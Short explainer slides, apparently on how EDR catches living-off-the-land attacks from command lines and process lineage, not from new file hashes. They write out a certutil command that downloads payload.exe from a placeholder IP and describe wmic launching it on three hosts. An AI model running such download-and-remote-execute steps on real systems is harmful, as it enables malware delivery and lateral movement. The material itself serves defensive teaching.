eyebrow: No new file, no new hash
code:
certutil.exe -urlcache -split -f http://203.0.113.44/payload.exe payload.exe

File on disk: certutil.exe   [legitimate, signed, pre-existing]
Signature scan result: CLEAN -- nothing new to hash
caption: The binary was never new. Only the command line reveals what actually happened.

code:
1. certutil.exe downloads payload.exe        [flagged: known downloader pattern]
2. wmic.exe launches payload.exe on 3 hosts   [flagged: suspicious remote execution]
3. Same process lineage traced back to foothold
caption: No new malware anywhere -- EDR catches this from command-line content and lineage alone.
